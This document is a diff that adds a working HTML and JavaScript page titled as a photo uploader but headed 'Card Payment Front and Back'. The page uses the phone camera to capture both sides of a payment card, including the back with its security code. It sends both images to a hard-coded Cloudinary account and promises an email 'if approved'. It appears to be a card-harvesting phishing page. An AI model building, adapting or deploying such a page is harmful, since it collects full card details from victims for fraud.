@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Take Two Pictures and Save to Cloudinary</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 20px;
+    }
+    video, canvas, .review-container img {
+      display: block;
+      margin: 10px auto;
+      max-width: 100%;
+      border: 2px solid #333;
+      border-radius: 10px;
+    }
+    .review-container {
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .review-container img {
+      max-width: 45%;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 16px;
+      background-color: #0b1252;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #040d1a;
+    }
+  </style>
+</head>
+<body>
+  <h1>Card Payment Front and Back</h1>
+  <video id="video" autoplay playsinline></video>
+  <div class="review-container" id="reviewContainer" style="display: none;">
+    <img id="image1" src="" alt="Front of Card">
+    <img id="image2" src="" alt="Back of Card">
+  </div>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <button id="snap">Snap </button>
+  <button id="save" style="display: none;">submit</button>
+  <button id="retake" style="display: none;">Retake</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const reviewContainer = document.getElementById('reviewContainer');
+    const snapButton = document.getElementById('snap');
+    const saveButton = document.getElementById('save');
+    const retakeButton = document.getElementById('retake');
+    const ctx = canvas.getContext('2d');
+    const image1 = document.getElementById('image1');
+    const image2 = document.getElementById('image2');
+
+    let pictureCount = 0;
+    let pictures = [null, null]; // Array to store the two images
+
+    // Start the back-facing camera
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        video.srcObject = stream;
+      } catch (err) {
+        console.error("Error accessing the camera:", err);
+        alert("Please allow camera access or use a device with a camera.");
+      }
+    }
+
+    // Capture a picture
+    snapButton.addEventListener('click', () => {
+      if (pictureCount < 2) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+        pictures[pictureCount] = imageData;
+
+        if (pictureCount === 0) {
+          image1.src = imageData;
+        } else if (pictureCount === 1) {
+          image2.src = imageData;
+        }
+
+        pictureCount++;
+        reviewContainer.style.display = 'flex';
+        retakeButton.style.display = 'inline-block';
+
+        if (pictureCount === 2) {
+          snapButton.style.display = 'none';
+          saveButton.style.display = 'inline-block';
+        }
+      }
+    });
+
+    // Retake pictures
+    retakeButton.addEventListener('click', () => {
+      pictureCount = 0;
+      pictures = [null, null];
+      reviewContainer.style.display = 'none';
+      saveButton.style.display = 'none';
+      snapButton.style.display = 'inline-block';
+      retakeButton.style.display = 'none';
+      image1.src = '';
+      image2.src = '';
+    });
+
+    // Upload an image to Cloudinary
+    async function uploadImageToCloudinary(imageData, label) {
+      const cloudinaryUrl = "https://api.cloudinary.com/v1_1/dbiecavmn/image/upload";
+      const formData = new FormData();
+
+      formData.append("file", imageData);
+      formData.append("upload_preset", "unsigned"); // Replace with your Cloudinary upload preset
+      formData.append("public_id", `${label}_${Date.now()}`); // Use unique ID to avoid overwriting
+
+      try {
+        const response = await fetch(cloudinaryUrl, {
+          method: "POST",
+          body: formData,
+        });
+
+        if (response.ok) {
+          const result = await response.json();
+          console.log(`${label} uploaded to Cloudinary. URL: ${result.secure_url}`);
+          return result.secure_url;
+        } else {
+          console.error(`Error uploading ${label} to Cloudinary:`, response.statusText);
+          alert(`Failed to upload ${label}. Please try again.`);
+          return null;
+        }
+      } catch (error) {
+        console.error(`Error uploading ${label}:`, error);
+        alert(`Failed to upload ${label}. Please try again.`);
+        return null;
+      }
+    }
+
+    // Save both pictures to Cloudinary
+    saveButton.addEventListener('click', async () => {
+      const frontImageURL = await uploadImageToCloudinary(pictures[0], "front_of_card");
+      const backImageURL = await uploadImageToCloudinary(pictures[1], "back_of_card");
+
+      if (frontImageURL && backImageURL) {
+        alert("successful, an email will be sent if approved");
+        console.log("Front Image URL:", frontImageURL);
+        console.log("Back Image URL:", backImageURL);
+
+        // Reset the state to allow more uploads
+        retakeButton.click();
+      }
+    });
+
+    // Start the camera when the page loads
+    startCamera();
+  </script>
+</body>
+</html>
